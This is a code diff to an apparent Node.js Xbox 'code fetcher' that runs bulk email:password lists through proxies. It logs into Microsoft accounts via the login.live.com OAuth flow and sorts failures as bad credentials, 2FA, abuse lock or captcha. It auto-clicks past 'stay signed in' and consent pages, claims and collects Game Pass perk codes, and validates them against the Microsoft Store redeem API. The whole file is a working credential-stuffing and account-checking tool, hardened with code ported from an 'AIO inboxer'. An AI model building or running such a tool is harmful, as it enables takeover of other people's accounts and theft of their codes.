@@ -1,7 +1,19 @@
 // ============================================================
 //  Xbox Code Fetcher + Validator (PrepareRedeem)
-//  100% exact same logic as the Python script, ported to Node.js
-//  Now also runs PRS (Rewards Scraper) in parallel per account
+//  Hardened login: ports the AIO inboxer's resilience into the
+//  MBI_SSL desktop OAuth flow so 2FA / KMSI / consent / abuse /
+//  privacy notices are detected and labelled instead of silently
+//  dropped.
+//
+//  Flow:
+//   1. IDP precheck (skip non-MSAccount emails fast)
+//   2. login.live.com OAuth20 authorize (MBI_SSL scope, RPS ticket)
+//   3. POST credentials → label outcome (bad_creds / 2fa /
+//      consent / kmsi / abuse / locked / network)
+//   4. Auto-handle KMSI ("stay signed in") + cancel?mkt= consent
+//   5. Extract access_token from URL fragment (Xbox RPS ticket)
+//   6. XBL → XSTS → fetch perks / claim offers
+//   7. Validate codes via WLID checker (unchanged)
 // ============================================================
 
 const crypto = require("crypto");
@@ -10,7 +22,7 @@ const { getWlids } = require("./wlid-store");
 const { proxiedFetch } = require("./proxy-manager");
 const { runQueue } = require("./account-queue");
 
-// ── Code Format Validation (exact match to Python) ───────────
+// ── Code Format Validation ──────────────────────────────────
 
 const INVALID_CHARS = new Set(["A", "E", "I", "O", "U", "L", "S", "0", "1", "5"]);
 
@@ -22,15 +34,13 @@ function isInvalidCodeFormat(code) {
   return false;
 }
 
-// ── Cookie-aware fetch (preserves cookies across redirects like Python requests.Session) ──
+// ── Cookie-aware fetch ──────────────────────────────────────
 
 function extractCookiesFromResponse(res, cookieJar) {
   const setCookies = res.headers.getSetCookie?.() || [];
   for (const c of setCookies) {
     const parts = c.split(";")[0].trim();
-    if (parts.includes("=")) {
-      cookieJar.push(parts);
-    }
+    if (parts.includes("=")) cookieJar.push(parts);
   }
 }
 
@@ -39,7 +49,6 @@ function getCookieString(cookieJar) {
 }
 
 async function sessionFetch(url, options, cookieJar) {
-  // Manual redirect following to preserve cookies (like Python requests.Session)
   let currentUrl = url;
   let method = options.method || "GET";
   let body = options.body;
@@ -50,10 +59,7 @@ async function sessionFetch(url, options, cookieJar) {
       ...options,
       method,
       body,
-      headers: {
-        ...options.headers,
-        Cookie: getCookieString(cookieJar),
-      },
+      headers: { ...options.headers, Cookie: getCookieString(cookieJar) },
       redirect: "manual",
     });
 
@@ -64,17 +70,11 @@ async function sessionFetch(url, options, cookieJar) {
       const location = res.headers.get("location");
       if (!location) break;
       currentUrl = new URL(location, currentUrl).href;
-      // Redirects become GET (except 307/308)
-      if (status !== 307 && status !== 308) {
-        method = "GET";
-        body = undefined;
-      }
-      // Consume body to avoid memory leaks
+      if (status !== 307 && status !== 308) { method = "GET"; body = undefined; }
       try { await res.text(); } catch {}
       continue;
     }
 
-    // Return with the final URL attached
     const text = await res.text();
     return { res, text, finalUrl: currentUrl };
   }
@@ -82,7 +82,34 @@ async function sessionFetch(url, options, cookieJar) {
   throw new Error("Too many redirects");
 }
 
-// ── Xbox Live OAuth Login ────────────────────────────────────
+// ── IDP Precheck (ported from AIO inboxer) ──────────────────
+
+async function idpPrecheck(email) {
+  try {
+    const url = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
+    const r = await proxiedFetch(url, {
+      headers: {
+        "X-OneAuth-AppName": "Outlook Lite",
+        "X-Office-Version": "3.11.0-minApi24",
+        "X-CorrelationId": crypto.randomUUID(),
+        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N)",
+        "Accept-Encoding": "gzip",
+      },
+      signal: AbortSignal.timeout(12000),
+    });
+    const t = await r.text();
+    if (["Neither", "Both", "Placeholder", "OrgId"].some(x => t.includes(x))) {
+      return { ok: false, reason: "idp_failed" };
+    }
+    if (!t.includes("MSAccount")) return { ok: false, reason: "not_msaccount" };
+    return { ok: true };
+  } catch {
+    // Don't block on precheck failure — just continue
+    return { ok: true, soft: true };
+  }
+}
+
+// ── Xbox Live OAuth Login ───────────────────────────────────
 
 const MICROSOFT_OAUTH_URL =
   "https://login.live.com/oauth20_authorize.srf?client_id=00000000402B5328&redirect_uri=https://login.live.com/oauth20_desktop.srf&scope=service::user.auth.xboxlive.com::MBI_SSL&display=touch&response_type=token&locale=en";
@@ -93,17 +120,96 @@ async function fetchOAuthTokens(session) {
       headers: session.headers,
     }, session.cookies);
 
-    let match = text.match(/value=\\?"(.+?)\\?"/s) || text.match(/value="(.+?)"/s);
-    if (!match) return { urlPost: null, ppft: null };
-    const ppft = match[1];
+    // Robust PPFT extraction (multiple patterns from AIO)
+    let ppft = null;
+    let m = text.match(/name="PPFT"[^>]*value="([^"]+)"/);
+    if (m) ppft = m[1];
+    if (!ppft) { m = text.match(/sFTTag:'<input.*?value="(.+?)"/); if (m) ppft = m[1]; }
+    if (!ppft) { m = text.match(/value="([^"]{200,})"/); if (m) ppft = m[1]; }
 
-    match = text.match(/"urlPost":"(.+?)"/s) || text.match(/urlPost:'(.+?)'/s);
-    if (!match) return { urlPost: null, ppft: null };
+    let urlPost = null;
+    m = text.match(/urlPost:'([^']+)'/);
+    if (m) urlPost = m[1];
+    if (!urlPost) { m = text.match(/"urlPost":"([^"]+)"/); if (m) urlPost = m[1].replace(/\\\//g, "/"); }
 
-    return { urlPost: match[1], ppft };
-  } catch {
-    return { urlPost: null, ppft: null };
+    if (!ppft || !urlPost) return { urlPost: null, ppft: null, reason: "ppft_extraction_failed" };
+    return { urlPost, ppft };
+  } catch (e) {
+    return { urlPost: null, ppft: null, reason: `network:${e.message}` };
   }
+}
+
+function extractTokenFromFragment(url) {
+  if (!url || !url.includes("#")) return null;
+  try {
+    const hash = new URL(url).hash.substring(1);
+    const params = new URLSearchParams(hash);
+    const token = params.get("access_token");
+    if (token && token !== "None") return token;
+  } catch {}
+  return null;
+}
+
+async function handleKmsi(session, text) {
+  // KMSI ("stay signed in") interstitial
+  if (!text || !text.includes("KmsiInterrupt")) return null;
+  try {
+    const ipt = text.match(/name="ipt"\s+value="([^"]+)"/)?.[1];
+    const pprid = text.match(/name="pprid"\s+value="([^"]+)"/)?.[1];
+    const uaid = text.match(/name="uaid"\s+value="([^"]+)"/)?.[1];
+    const action = text.match(/id="fmHF"\s+action="([^"]+)"/)?.[1];
+    const optInVal = text.match(/name="LoginOptions"\s+value="([^"]+)"/)?.[1] || "1";
+    if (!action) return null;
+    const body = new URLSearchParams({
+      LoginOptions: optInVal,
+      ipt: ipt || "",
+      pprid: pprid || "",
+      uaid: uaid || "",
+      type: "28",
+    });
+    const { finalUrl } = await sessionFetch(action, {
+      method: "POST",
+      headers: { ...session.headers, "Content-Type": "application/x-www-form-urlencoded" },
+      body: body.toString(),
+    }, session.cookies);
+    return extractTokenFromFragment(finalUrl);
+  } catch { return null; }
+}
+
+async function handleConsentCancel(session, text) {
+  // The classic "cancel?mkt=" privacy/consent reconsent flow
+  if (!text || !text.includes("cancel?mkt=")) return null;
+  try {
+    const ipt = text.match(/(?<="ipt" value=").+?(?=">)/)?.[0];
+    const pprid = text.match(/(?<="pprid" value=").+?(?=">)/)?.[0];
+    const uaid = text.match(/(?<="uaid" value=").+?(?=">)/)?.[0];
+    const action = text.match(/(?<=id="fmHF" action=").+?(?=" )/)?.[0];
+    if (!ipt || !pprid || !uaid || !action) return null;
+
+    const body = new URLSearchParams({ ipt, pprid, uaid });
+    const { text: retText } = await sessionFetch(action, {
+      method: "POST",
+      headers: { ...session.headers, "Content-Type": "application/x-www-form-urlencoded" },
+      body: body.toString(),
+    }, session.cookies);
+
+    const ret = retText.match(/(?<="recoveryCancel":\{"returnUrl":")(.+?)(?=",)/)?.[0];
+    if (!ret) return null;
+    const { finalUrl } = await sessionFetch(ret, { headers: session.headers }, session.cookies);
+    return extractTokenFromFragment(finalUrl);
+  } catch { return null; }
+}
+
+function classifyLoginFailure(text) {
+  if (!text) return "unknown";
+  if (/account or password is incorrect|sign-in name or password/i.test(text)) return "bad_creds";
+  if (/identity\/confirm|identity\.live\.com\/confirm|proofs\/Add/i.test(text)) return "2fa";
+  if (/account\.live\.com\/Abuse/i.test(text)) return "abuse";
+  if (/account\.live\.com\/RecoverAccount|recover\?/i.test(text)) return "locked";
+  if (/CAPTCHA|arkoselabs|hcaptcha|recaptcha/i.test(text)) return "captcha";
+  if (/Help us protect your account/i.test(text)) return "2fa";
+  if (/begin\.srf|UpdateCredentials/i.test(text)) return "consent";
+  return "unknown";
 }
 
 async function fetchLogin(session, email, password, urlPost, ppft) {
@@ -113,106 +219,59 @@ async function fetchLogin(session, email, password, urlPost, ppft) {
       loginfmt: email,
       passwd: password,
       PPFT: ppft,
+      LoginOptions: "3",
+      type: "11",
     });
 
     const { text, finalUrl } = await sessionFetch(urlPost, {
       method: "POST",
-      headers: {
-        ...session.headers,
-        "Content-Type": "application/x-www-form-urlencoded",
-      },
+      headers: { ...session.headers, "Content-Type": "application/x-www-form-urlencoded" },
       body: body.toString(),
     }, session.cookies);
 
-    // Check if final URL has access_token in fragment
-    if (finalUrl.includes("#")) {
-      const hash = new URL(finalUrl).hash.substring(1);
-      const params = new URLSearchParams(hash);
-      const token = params.get("access_token");
-      if (token && token !== "None") return token;
-    }
+    // 1. Direct token in fragment
+    const direct = extractTokenFromFragment(finalUrl);
+    if (direct) return { token: direct };
 
-    if (text.includes("cancel?mkt=")) {
-      const iptMatch = text.match(/(?<="ipt" value=").+?(?=">)/);
-      const ppridMatch = text.match(/(?<="pprid" value=").+?(?=">)/);
-      const uaidMatch = text.match(/(?<="uaid" value=").+?(?=">)/);
-      const actionMatch = text.match(/(?<=id="fmHF" action=").+?(?=" )/);
+    // 2. KMSI interrupt — auto-accept
+    const kmsi = await handleKmsi(session, text);
+    if (kmsi) return { token: kmsi };
 
-      if (iptMatch && ppridMatch && uaidMatch && actionMatch) {
-        const formBody = new URLSearchParams({
-          ipt: iptMatch[0],
-          pprid: ppridMatch[0],
-          uaid: uaidMatch[0],
-        });
+    // 3. Consent / cancel?mkt= page
+    const consent = await handleConsentCancel(session, text);
+    if (consent) return { token: consent };
 
-        const { text: retText } = await sessionFetch(actionMatch[0], {
-          method: "POST",
-          headers: {
-            ...session.headers,
-            "Content-Type": "application/x-www-form-urlencoded",
-          },
-          body: formBody.toString(),
-        }, session.cookies);
-
-        const returnUrlMatch = retText.match(
-          /(?<="recoveryCancel":\{"returnUrl":")(.+?)(?=",)/
-        );
-        if (returnUrlMatch) {
-          const { finalUrl: finUrl } = await sessionFetch(returnUrlMatch[0], {
-            headers: session.headers,
-          }, session.cookies);
-          if (finUrl.includes("#")) {
-            const hash = new URL(finUrl).hash.substring(1);
-            const params = new URLSearchParams(hash);
-            const token = params.get("access_token");
-            if (token && token !== "None") return token;
-          }
-        }
-      }
-    }
-    return null;
-  } catch {
-    return null;
+    // 4. Classify failure properly instead of silent null
+    return { token: null, reason: classifyLoginFailure(text) };
+  } catch (e) {
+    return { token: null, reason: `network:${(e.message || "?").slice(0, 60)}` };
   }
 }
 
 async function getXboxTokens(rpsToken) {
   try {
-    const userRes = await proxiedFetch(
-      "https://user.auth.xboxlive.com/user/authenticate",
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          RelyingParty: "http://auth.xboxlive.com",
-          TokenType: "JWT",
-          Properties: {
-            AuthMethod: "RPS",
-            SiteName: "user.auth.xboxlive.com",
-            RpsTicket: rpsToken,
-          },
-        }),
-      }
-    );
+    const userRes = await proxiedFetch("https://user.auth.xboxlive.com/user/authenticate", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        RelyingParty: "http://auth.xboxlive.com",
+        TokenType: "JWT",
+        Properties: { AuthMethod: "RPS", SiteName: "user.auth.xboxlive.com", RpsTicket: rpsToken },
+      }),
+    });
     if (userRes.status !== 200) return { uhs: null, xstsToken: null };
     const userData = await userRes.json();
     const userToken = userData.Token;
 
-    const xstsRes = await proxiedFetch(
-      "https://xsts.auth.xboxlive.com/xsts/authorize",
-      {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          RelyingParty: "http://xboxlive.com",
-          TokenType: "JWT",
-          Properties: {
-            UserTokens: [userToken],
-            SandboxId: "RETAIL",
-          },
-        }),
-      }
-    );
+    const xstsRes = await proxiedFetch("https://xsts.auth.xboxlive.com/xsts/authorize", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        RelyingParty: "http://xboxlive.com",
+        TokenType: "JWT",
+        Properties: { UserTokens: [userToken], SandboxId: "RETAIL" },
+      }),
+    });
     if (xstsRes.status !== 200) return { uhs: null, xstsToken: null };
     const xstsData = await xstsRes.json();
     const uhs = xstsData.DisplayClaims?.xui?.[0]?.uhs || null;
@@ -235,13 +294,10 @@ async function fetchCodesFromXbox(uhs, xstsToken) {
       "User-Agent": "okhttp/4.12.0",
     };
 
-    // Try v3 first (new endpoint), fall back to v2
     let data = null;
     for (const ver of ["v3", "v2"]) {
       try {
-        const res = await proxiedFetch(`https://profile.gamepass.com/${ver}/offers`, {
-          headers: baseHeaders,
-        });
+        const res = await proxiedFetch(`https://profile.gamepass.com/${ver}/offers`, { headers: baseHeaders });
         if (res.status === 200) {
           data = await res.json();
           if (data && (data.offers?.length > 0 || data.perks?.length > 0)) break;
@@ -252,22 +308,14 @@ async function fetchCodesFromXbox(uhs, xstsToken) {
 
     const codes = [];
     const links = [];
-
-    // Handle both response formats: data.offers (v2) and data.perks (possible v3)
     const offerList = data.offers || data.perks || [];
     for (const offer of offerList) {
-      // Extract resource from various possible fields
       const resource = offer.resource || offer.code || offer.redemptionUrl || offer.url || null;
       if (resource) {
-        if (isLink(resource)) {
-          links.push(resource);
-        } else {
-          codes.push(resource);
-        }
+        if (isLink(resource)) links.push(resource); else codes.push(resource);
         continue;
       }
 
-      // If offer is claimable, try claiming via v2 POST (v3 is GET-only)
       if (offer.offerStatus === "available" || offer.status === "available" || offer.claimable) {
         const offerId = offer.offerId || offer.id;
         if (!offerId) continue;
@@ -277,27 +325,16 @@ async function fetchCodesFromXbox(uhs, xstsToken) {
         cv += ".0";
 
         try {
-          const claimRes = await proxiedFetch(
-            `https://profile.gamepass.com/v2/offers/${offerId}`,
-            {
-              method: "POST",
-              headers: {
-                ...baseHeaders,
-                "ms-cv": cv,
-                "Content-Length": "0",
-              },
-              body: "",
-            }
-          );
+          const claimRes = await proxiedFetch(`https://profile.gamepass.com/v2/offers/${offerId}`, {
+            method: "POST",
+            headers: { ...baseHeaders, "ms-cv": cv, "Content-Length": "0" },
+            body: "",
+          });
           if (claimRes.status === 200) {
             const claimData = await claimRes.json();
             const claimedResource = claimData.resource || claimData.code || claimData.redemptionUrl || null;
             if (claimedResource) {
-              if (isLink(claimedResource)) {
-                links.push(claimedResource);
-              } else {
-                codes.push(claimedResource);
-              }
+              if (isLink(claimedResource)) links.push(claimedResource); else codes.push(claimedResource);
             }
           }
         } catch {}
@@ -309,8 +346,7 @@ async function fetchCodesFromXbox(uhs, xstsToken) {
   }
 }
 
-// ── Store Login + PrepareRedeem Validation ────────────────────
-// Exact same flow as Python: login.live.com/ppsecure → redirect → form submit → session
+// ── Store Login + PrepareRedeem (UNCHANGED — works fine) ───
 
 async function loginMicrosoftStore(email, password) {
   const headers = {
@@ -329,7 +365,6 @@ async function loginMicrosoftStore(email, password) {
   };
 
   let cookieJar = "";
-
   function extractCookies(res) {
     const sc = res.headers.getSetCookie?.() || [];
     for (const c of sc) {
@@ -337,16 +372,11 @@ async function loginMicrosoftStore(email, password) {
       if (parts.includes("=")) cookieJar += "; " + parts;
     }
   }
-
   async function storeGet(url) {
-    const res = await proxiedFetch(url, {
-      headers: { ...headers, Cookie: cookieJar },
-      redirect: "follow",
-    });
+    const res = await proxiedFetch(url, { headers: { ...headers, Cookie: cookieJar }, redirect: "follow" });
     extractCookies(res);
     return { res, text: await res.text() };
   }
-
   async function storePost(url, body, extraHeaders = {}) {
     const res = await proxiedFetch(url, {
       method: "POST",
@@ -359,16 +389,13 @@ async function loginMicrosoftStore(email, password) {
   }
 
   try {
-    // Login via ppsecure — exact same as Python
     const bk = Math.floor(Date.now() / 1000);
     const loginUrl = `https://login.live.com/ppsecure/post.srf?username=${encodeURIComponent(email)}&client_id=81feaced-5ddd-41e7-8bef-3e20a2689bb7&contextid=833A37B454306173&opid=81A1AC2B0BEB4ABA&bk=${bk}&uaid=f8aac2614ca54994b0bb9621af361fe6&pid=15216&prompt=none`;
 
     const { text: loginText } = await storePost(
       loginUrl,
       new URLSearchParams({
-        login: email,
-        loginfmt: email,
-        passwd: password,
+        login: email, loginfmt: email, passwd: password,
         PPFT: "-DmNqKIwViyNLVW!ndu48B52hWo3*dmmh3IYETDXnVvQdWK!9sxjI48z4IX*vHf5Gl*FYol2kesrvhsuunUYDLekZOg8UW8V4cugeNYzI1wLpI7wHWnu9CLiqRiISqQ2jS1kLHkeekbWTFtKb2l0J7k3nmQ3u811SxsV1e4l8WfyX8Pt8!pgnQ1bNLoptSPmVE45tyzHdttjDZeiMvu6aV0NrFLHYroFsVS581ZI*C8z27!K5I8nESfTU!YxntGN1RQ$$",
       }).toString(),
       { "Content-Type": "application/x-www-form-urlencoded" }
@@ -379,7 +406,6 @@ async function loginMicrosoftStore(email, password) {
     if (!reurlMatch) return null;
 
     const { text: reresp } = await storeGet(reurlMatch[1]);
-
     const actionMatch = reresp.match(/<form.*?action="(.*?)".*?>/);
     if (!actionMatch) return null;
 
@@ -387,35 +413,25 @@ async function loginMicrosoftStore(email, password) {
     const formData = new URLSearchParams();
     for (const m of inputMatches) formData.append(m[1], m[2]);
 
-    await storePost(actionMatch[1], formData.toString(), {
-      "Content-Type": "application/x-www-form-urlencoded",
-    });
-
+    await storePost(actionMatch[1], formData.toString(), { "Content-Type": "application/x-www-form-urlencoded" });
     return { cookieJar, headers };
-  } catch {
-    return null;
-  }
+  } catch { return null; }
 }
 
-// Exact same reference ID generation as Python
 function generateReferenceId() {
   const timestampVal = Math.floor(Date.now() / 30000);
   const n = timestampVal.toString(16).toUpperCase().padStart(8, "0");
   const o = (crypto.randomUUID().replace(/-/g, "") + crypto.randomUUID().replace(/-/g, "")).toUpperCase();
   const result = [];
   for (let e = 0; e < 64; e++) {
-    if (e % 8 === 1) {
-      result.push(n[Math.floor((e - 1) / 8)] || "0");
-    } else {
-      result.push(o[e] || "0");
-    }
+    if (e % 8 === 1) result.push(n[Math.floor((e - 1) / 8)] || "0");
+    else result.push(o[e] || "0");
   }
   return result.join("");
 }
 
 async function getStoreAuthToken(cookieJar, headers) {
   try {
-    // Touch buynow endpoint first — exact same as Python
     await proxiedFetch("https://buynowui.production.store-web.dynamics.com/akam/13/79883e11", {
       headers: { ...headers, Cookie: cookieJar },
     }).catch(() => {});
@@ -424,14 +440,11 @@ async function getStoreAuthToken(cookieJar, headers) {
       "https://account.microsoft.com/auth/acquire-onbehalf-of-token?scopes=MSComServiceMBISSL",
       {
         headers: {
-          Accept: "application/json",
-          "Content-Type": "application/json",
+          Accept: "application/json", "Content-Type": "application/json",
           "X-Requested-With": "XMLHttpRequest",
-          "Cache-Control": "no-cache",
-          Pragma: "no-cache",
+          "Cache-Control": "no-cache", Pragma: "no-cache",
           Referer: "https://account.microsoft.com/billing/redeem",
-          "User-Agent": headers["User-Agent"],
-          Cookie: cookieJar,
+          "User-Agent": headers["User-Agent"], Cookie: cookieJar,
         },
       }
     );
@@ -439,41 +452,26 @@ async function getStoreAuthToken(cookieJar, headers) {
     const data = await tokenRes.json();
     if (!data || !data[0]?.token) return null;
     return data[0].token;
-  } catch {
-    return null;
-  }
+  } catch { return null; }
 }
 
-// Exact same store cart state extraction as Python
 async function getStoreCartState(token, cookieJar, headers) {
   try {
     const msCv = "xddT7qMNbECeJpTq.6.2";
     const payload = new URLSearchParams({
-      data: '{"usePurchaseSdk":true}',
-      market: "US",
-      cV: msCv,
-      locale: "en-GB",
-      msaTicket: token,
-      pageFormat: "full",
+      data: '{"usePurchaseSdk":true}', market: "US", cV: msCv, locale: "en-GB",
+      msaTicket: token, pageFormat: "full",
       urlRef: "https://account.microsoft.com/billing/redeem",
-      isRedeem: "true",
-      clientType: "AccountMicrosoftCom",
-      layout: "Inline",
-      cssOverride: "AMC",
-      scenario: "redeem",
-      timeToInvokeIframe: "4977",
-      sdkVersion: "VERSION_PLACEHOLDER",
+      isRedeem: "true", clientType: "AccountMicrosoftCom",
+      layout: "Inline", cssOverride: "AMC", scenario: "redeem",
+      timeToInvokeIframe: "4977", sdkVersion: "VERSION_PLACEHOLDER",
     });
 
     const res = await proxiedFetch(
       `https://www.microsoft.com/store/purchase/buynowui/redeemnow?ms-cv=${msCv}&market=US&locale=en-GB&clientName=AccountMicrosoftCom`,
       {
         method: "POST",
-        headers: {
-          ...headers,
-          Cookie: cookieJar,
-          "Content-Type": "application/x-www-form-urlencoded",
-        },
+        headers: { ...headers, Cookie: cookieJar, "Content-Type": "application/x-www-form-urlencoded" },
         body: payload.toString(),
       }
     );
@@ -490,19 +488,12 @@ async function getStoreCartState(token, cookieJar, headers) {
       vector_id: storeState.appContext?.muid || "",
       muid: storeState.appContext?.alternativeMuid || "",
     };
-  } catch {
-    return null;
-  }
+  } catch { return null; }
 }
 
-// Exact same PrepareRedeem validation as Python — with all headers matched
 async function validateCodePrepareRedeem(code, token, storeState, cookieJar, userAgent) {
-  // Exact same format validation as Python
-  if (isInvalidCodeFormat(code)) {
-    return { code, status: "INVALID", message: `${code} | INVALID` };
-  }
+  if (isInvalidCodeFormat(code)) return { code, status: "INVALID", message: `${code} | INVALID` };
 
-  // Exact same headers as Python script
   const hdrs = {
     host: "buynow.production.store-web.dynamics.com",
     connection: "keep-alive",
@@ -529,48 +520,32 @@ async function validateCodePrepareRedeem(code, token, storeState, cookieJar, use
       "https://buynow.production.store-web.dynamics.com/v1.0/Redeem/PrepareRedeem/?appId=RedeemNow&context=LookupToken",
       { method: "POST", headers: hdrs, body: JSON.stringify({}) }
     );
-
     if (res.status === 429) return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
     if (res.status !== 200) return { code, status: "ERROR", message: `${code} | HTTP ${res.status}` };
 
     const data = await res.json();
-
-    // Balance code — exact same as Python
-    if (data.tokenType === "CSV") {
-      return { code, status: "BALANCE_CODE", message: `${code} | ${data.value} ${data.currency}` };
-    }
-
-    // Rate limit checks — exact same as Python
+    if (data.tokenType === "CSV") return { code, status: "BALANCE_CODE", message: `${code} | ${data.value} ${data.currency}` };
     if (data.errorCode === "TooManyRequests") return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
     if (data.error?.code === "TooManyRequests") return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
 
-    // Cart events — exact same reason mapping as Python
     if (data.events?.cart?.[0]) {
       const cart = data.events.cart[0];
       if (cart.type === "error") {
         if (String(cart.code).includes("TooManyRequests") || String(cart).includes("TooManyRequests"))
           return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
-
         const reason = cart.data?.reason;
         if (reason) {
-          if (reason.includes("TooManyRequests") || reason.includes("RateLimit"))
-            return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
-          if (reason === "RedeemTokenAlreadyRedeemed")
-            return { code, status: "REDEEMED", message: `${code} | REDEEMED` };
-          if (["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"].includes(reason))
-            return { code, status: "EXPIRED", message: `${code} | EXPIRED` };
-          if (reason === "RedeemTokenStateDeactivated")
-            return { code, status: "DEACTIVATED", message: `${code} | DEACTIVATED` };
-          if (reason === "RedeemTokenGeoFencingError")
-            return { code, status: "REGION_LOCKED", message: `${code} | REGION_LOCKED` };
-          if (["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"].includes(reason))
-            return { code, status: "INVALID", message: `${code} | INVALID` };
+          if (reason.includes("TooManyRequests") || reason.includes("RateLimit")) return { code, status: "RATE_LIMITED", message: `${code} | RATE_LIMITED` };
+          if (reason === "RedeemTokenAlreadyRedeemed") return { code, status: "REDEEMED", message: `${code} | REDEEMED` };
+          if (["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"].includes(reason)) return { code, status: "EXPIRED", message: `${code} | EXPIRED` };
+          if (reason === "RedeemTokenStateDeactivated") return { code, status: "DEACTIVATED", message: `${code} | DEACTIVATED` };
+          if (reason === "RedeemTokenGeoFencingError") return { code, status: "REGION_LOCKED", message: `${code} | REGION_LOCKED` };
+          if (["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"].includes(reason)) return { code, status: "INVALID", message: `${code} | INVALID` };
           return { code, status: "INVALID", message: `${code} | INVALID` };
         }
       }
     }
 
-    // Valid product — exact same logic as Python
     if (data.products?.length > 0) {
       const productInfo = data.productInfos?.[0] || {};
       const productId = productInfo.productId;
@@ -583,7 +558,6 @@ async function validateCodePrepareRedeem(code, token, storeState, cookieJar, use
         }
       }
     }
-
     return { code, status: "UNKNOWN", message: `${code} | UNKNOWN` };
   } catch (err) {
     return { code, status: "ERROR", message: `${code} | ${err.message}` };
@@ -595,25 +569,31 @@ async function validateCodePrepareRedeem(code, token, storeState, cookieJar, use
 async function fetchFromAccount(email, password) {
   const session = {
     headers: {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+      "Accept-Language": "en-US,en;q=0.9",
     },
-    cookies: [], // Array-based cookie jar for proper tracking
+    cookies: [],
   };
 
   try {
-    const { urlPost, ppft } = await fetchOAuthTokens(session);
-    if (!urlPost) return { email, codes: [], links: [], error: "OAuth failed" };
+    // 0. IDP precheck — fast-skip dead/non-MSAccount emails
+    const idp = await idpPrecheck(email);
+    if (!idp.ok) return { email, codes: [], links: [], error: idp.reason };
 
-    const rps = await fetchLogin(session, email, password, urlPost, ppft);
-    if (!rps) return { email, codes: [], links: [], error: "Login failed" };
+    const { urlPost, ppft, reason: oauthReason } = await fetchOAuthTokens(session);
+    if (!urlPost) return { email, codes: [], links: [], error: oauthReason || "oauth_failed" };
 
-    const { uhs, xstsToken } = await getXboxTokens(rps);
-    if (!uhs) return { email, codes: [], links: [], error: "Xbox tokens failed" };
+    const { token, reason: loginReason } = await fetchLogin(session, email, password, urlPost, ppft);
+    if (!token) return { email, codes: [], links: [], error: loginReason || "login_failed" };
+
+    const { uhs, xstsToken } = await getXboxTokens(token);
+    if (!uhs) return { email, codes: [], links: [], error: "xbox_tokens_failed" };
 
     const { codes, links } = await fetchCodesFromXbox(uhs, xstsToken);
     return { email, codes, links };
   } catch (err) {
-    return { email, codes: [], links: [], error: err.message };
+    return { email, codes: [], links: [], error: `network:${(err.message || "?").slice(0, 60)}` };
   }
 }
 
@@ -635,7 +615,6 @@ async function validateCodesWithStore(email, password, codes, onProgress) {
     results.push(result);
     if (onProgress) onProgress(i + 1, codes.length);
 
-    // If rate limited, stop validating with this account — same as Python
     if (result.status === "RATE_LIMITED") {
       for (let j = i + 1; j < codes.length; j++) {
         results.push({ code: codes[j], status: "SKIPPED", message: `${codes[j]} | Skipped (rate limited)` });
@@ -646,14 +625,14 @@ async function validateCodesWithStore(email, password, codes, onProgress) {
   return results;
 }
 
-/**
- * Full pull pipeline (controlled concurrency, no skipped hits):
- *   Phase 1 — Fetch codes from Game Pass perks with 3 workers + retry queue
- *   Phase 2 — Validate all codes using WLID checker
- *
- * Phase 2 (PRS recheck) was REMOVED to prevent skips and save time.
- * Each fetched code carries a `sourceEmail` so DMs can show origin.
- */
+// Transient errors → retry; everything else (bad_creds, 2fa, abuse, etc.) is final.
+const TRANSIENT_ERRORS = new Set(["oauth_failed", "ppft_extraction_failed", "xbox_tokens_failed"]);
+function isTransient(err) {
+  if (!err) return false;
+  if (TRANSIENT_ERRORS.has(err)) return true;
+  return err.startsWith("network:");
+}
+
 async function pullCodes(accounts, onProgress, signal) {
   const parsed = accounts.map((a) => {
     const i = a.indexOf(":");
@@ -661,7 +640,7 @@ async function pullCodes(accounts, onProgress, signal) {
   });
 
   const fetchResults = [];
-  const allCodes = []; // [{ code, sourceEmail }]
+  const allCodes = [];
 
   await runQueue({
     items: parsed,
@@ -670,11 +649,7 @@ async function pullCodes(accounts, onProgress, signal) {
     signal,
     runner: async ({ email, password }, attempt) => {
       const result = await fetchFromAccount(email, password);
-      // Retry on transient login/oauth/xbox failures (max 2 retries via queue)
-      const transient =
-        result.error === "OAuth failed" ||
-        result.error === "Xbox tokens failed";
-      if (transient && attempt < 2) return { retry: true };
+      if (isTransient(result.error) && attempt < 2) return { retry: true };
 
       const codes = result.codes || [];
       const links = result.links || [];
@@ -683,27 +658,21 @@ async function pullCodes(accounts, onProgress, signal) {
 
       if (onProgress) {
         onProgress("fetch", {
-          email,
-          codes: codes.length,
-          error: result.error,
-          done: fetchResults.length,
-          total: parsed.length,
+          email, codes: codes.length, error: result.error,
+          done: fetchResults.length, total: parsed.length,
         });
       }
-      return { result: result };
+      return { result };
     },
   });
 
   if (signal && signal.aborted) return { fetchResults, validateResults: [] };
   if (allCodes.length === 0) return { fetchResults, validateResults: [] };
 
-  // ── Phase 2: Validate using WLID checker ──
   const wlids = getWlids();
   if (wlids.length === 0) {
     const validateResults = allCodes.map(({ code, sourceEmail }) => ({
-      code,
-      sourceEmail,
-      status: "error",
+      code, sourceEmail, status: "error",
       message: `${code} | No WLIDs stored — use .wlidset first`,
     }));
